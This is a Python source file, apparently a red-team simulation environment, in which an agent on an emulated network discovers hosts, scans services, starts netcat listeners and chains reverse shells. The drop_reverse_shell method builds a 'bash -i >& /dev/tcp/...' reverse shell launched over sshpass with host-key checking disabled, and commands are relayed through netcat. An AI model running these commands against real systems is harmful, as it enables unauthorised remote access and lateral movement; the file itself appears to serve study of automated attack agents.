
import ipaddress
import networkx as nx
# from aco_emulator import ACOEmulator
import re
import matplotlib.pyplot as plt


class RedTeamEnv:
    def __init__(self, topo):
        self.topo = topo
        self.topo.build(interactive=False)
        self.net = topo.net
        self.red_agent_node = self.net.get('user0')
        self.observations = {
            'user0': {
                'IP Address': ipaddress.IPv4Address(self.red_agent_node.IP()), 
                'Subnet': ipaddress.IPv4Network(self.red_agent_node.IP() + '/24', strict=False),
                'Open Ports': [{'port': 22, 'protocol': 'tcp', 'service': 'ssh'}],
                'Access': 'root',
            }
        }
        self.reverse_shells = {}  # (src, dst) -> port

        
        # Track nodes with root access
        self.root_access_nodes = {'user0'}

        # Reachability graph with node metadata
        self.graph = nx.DiGraph()
        self.graph.add_node('user0', ip=ipaddress.IPv4Address('10.0.0.1'), access='root', open_ports=[22])

        # Map: hostname -> ipaddress.IPv4Address
        self.host_ip_map = {
            h.name: ipaddress.IPv4Address(h.IP()) for h in self.net.hosts
        }

    def get_observation(self):
        """Return a dict with current view of reachable nodes."""
        return self.observations

    def discover_remote_systems(self, subnet: str):
        """Run discover_remote.sh from a node in the given subnet with root access."""
        script_path = "/home/hacker/red_scripts/discover_remote.sh"
        try:
            subnet = ipaddress.IPv4Network(subnet, strict=False)
        except ValueError as e:
            print(f"[!] Invalid subnet: {subnet} — {e}")
            return

        selected_node = None
        for node in self.root_access_nodes:
            node_ip = self.host_ip_map.get(node)
            if node_ip and node_ip in subnet:
                selected_node = node
                break

        if not selected_node:
            print(f"[!] No root-access node found in subnet {subnet}")
            return

        docker = self.net.get(selected_node)
        print(f"[*] {selected_node} executing discovery on subnet {subnet}")

        subnet_prefix = str(subnet.network_address).rsplit('.', 1)[0]
        output = docker.cmd(f"./{script_path} {subnet_prefix}")

        for line in output.splitlines():
            if "Host up:" in line:
                discovered_ip_str = line.split()[-1]
                discovered_ip = ipaddress.IPv4Address(discovered_ip_str)
                target_host = self._resolve_ip_to_host(discovered_ip)
                if target_host and target_host not in self.graph.nodes:
                    self.graph.add_node(target_host, ip=discovered_ip, access='unknown')
                    self.graph.add_edge(selected_node, target_host)
                    
                    self.observations[target_host] = {
                        'IP Address': discovered_ip,
                        'Subnet': ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False),
                        'Open Ports': [],
                        'Access': 'unknown',
                    }
                    
                    print(f"[+] Discovered: {target_host} ({discovered_ip})")                

    def discover_network(self, target_ip: str):
        """Run service discovery (Nmap) on the target IP from a reachable root-access node."""
        script_path = "/home/hacker/red_scripts/discover_network.sh"
        
        source_node = None
        for node in self.root_access_nodes:
            if self._is_reachable(node, target_ip):
                source_node = node
                break

        if not source_node:
            print(f"[!] No root-access node can reach {target_ip}")
            return

        docker = self.net.get(source_node)
        print(f"[*] {source_node} executing service discovery on {target_ip}")
        output = docker.cmd(f"./{script_path} {target_ip}")
        
        # Parse Nmap output for open ports
        services = []
        for line in output.splitlines():
            match = re.match(r'^(\d+)/(tcp|udp)\s+open\s+(\S+)?', line)
            if match != None:
                port = int(match.group(1))
                protocol = match.group(2)
                service = match.group(3) if match.lastindex >= 3 else None
                services.append({
                    "port": port,
                    "protocol": protocol,
                    "service": service
                })

        if services:
            # Add/update graph node for target IP
            host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
            ip_address = target_ip
            
            if host:
                if host not in self.graph.nodes:
                    self.graph.add_node(host, ip=str(ip_address), access="unknown")
                    
                self.observations[host]['Open Ports'] = services

                # Update graph observation
                self.graph.nodes[host].update({'Open Ports': services})

                print(f"[+] Added services for {host}: {[s['port'] for s in services]}")
        else:
            print(f"[!] Host {target_ip} has no open ports.")
            
    def plot_graph(self):
        """Plot the current reachability graph with node labels and colors."""
        pos = nx.spring_layout(self.graph, seed=42)

        # Node colors: green = root, gray = unknown
        node_colors = []
        for _, attr in self.graph.nodes(data=True):
            if attr.get('access') == 'root':
                node_colors.append('lightgreen')
            else:
                node_colors.append('lightgray')

        # Node labels: include IP, access level and service info
        
        def get_service_info_str(open_ports):
            if open_ports:
                return "\n".join([f"{service['port']}/{service['protocol']} ({service['service']})" for service in open_ports])
            else:
                return ""
        
        labels = {
            node: f"{node}\n{data['ip']}\n({data['access']}){get_service_info_str(data.get('Open Ports', []))}"
            for node, data in self.graph.nodes(data=True)
        }

        plt.figure(figsize=(10, 6))
        nx.draw(self.graph, pos, with_labels=True, labels=labels, 
                node_color=node_colors, node_size=2500, font_size=8, edge_color='black')
        plt.title("Red Team Reachability Graph")
        plt.tight_layout()
        plt.show()
        
    def _resolve_ip_to_host(self, ip: ipaddress.IPv4Address):
        for host, host_ip in self.host_ip_map.items():
            if host_ip == ip:
                return host
        return None

    def _is_reachable(self, node, target_ip: str):
        """
        Returns True if the target host is reachable from node
        in the current reachability graph.
        """
        target_host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
        
        if nx.has_path(self.graph, node, target_host):
            return True
        return False

    def execute_command_on(self, target_node, command):
        """Send a command from user0 to a reachable target node via reverse shell chain."""
        relay_cmd = self._relay_command("user0", target_node, command)
        if relay_cmd:
            print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
            result = self.net.get("user0").cmd(relay_cmd)
            print(f"[<] Response:\n{result}")
            return result
        else:
            print("[!] Command not sent — path unreachable.")


    def _relay_command(self, source, target, final_command):
        """Construct a command relayed through the reverse shell chain."""
        try:
            path = nx.shortest_path(self.graph, source=source, target=target)
        except nx.NetworkXNoPath:
            print(f"[!] No path from {source} to {target}")
            return None

        cmd = final_command
        
        print(f"\n\n[*] Relaying command from {source} to {target} via path: {path}\n")
        
        if len(path) == 1:
            return cmd
        
        for i in range(len(path) - 1, 0, -1):
            attacker = path[i-1]
            victim = path[i]
            edge_data = self.graph[attacker][victim]
            port = edge_data.get("port")
            victim_ip = self.host_ip_map[victim]

            # Wrap the command to send via netcat
            cmd = f"echo \"{cmd}\" | nc {victim_ip} {port}"

        return cmd

    def start_listener(self, listener_host: str, listen_port: int):
        """Start a netcat listener on the given host and port."""
        cmd = f"nohup nc -lnvp {listen_port} > /dev/null 2>&1 &"
        print(f"[*] Starting listener on {listener_host}:{listen_port}")
        self.execute_command_on(listener_host, command=cmd)

        
    def drop_reverse_shell(self, from_host: str, to_host: str, revshell_port: int, username: str, password: str):
        """
        Establish a reverse shell from from_host to to_host.
        1. Starts a listener on to_host:revshell_port.
        2. From user0, tells from_host to SSH into itself and reverse shell to to_host.
        """
        attacker_ip = self.host_ip_map[to_host]
        target_ip = self.host_ip_map[from_host]

        # Step 1: Start listener on to_host via user0
        result = self.start_listener(listener_host=from_host, listen_port=revshell_port)
        print('Result: ', result)

        # Step 2: Send reverse shell from from_host to to_host via user0
        revshell_cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=5 {username}@{target_ip} "
            f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\" &"
        )

        print(f"[*] Dropping reverse shell from {from_host} to {to_host}:{revshell_port}")
        self.execute_command_on(from_host, command=revshell_cmd)

        # Update graph with new reachability edge
        self.register_reverse_shell(from_host, to_host, revshell_port)
    
    def register_reverse_shell(self, attacker, target, port):
        """Add reverse shell edge and metadata to graph."""
        self.reverse_shells[(attacker, target)] = port
        if self.graph.has_edge(attacker, target):
            self.graph[attacker][target].update(port=port, type="reverse_shell")
        else:
            self.graph.add_edge(attacker, target, port=port, type="reverse_shell")
        print(f"[+] Reverse shell established: {attacker} → {target} via port {port}")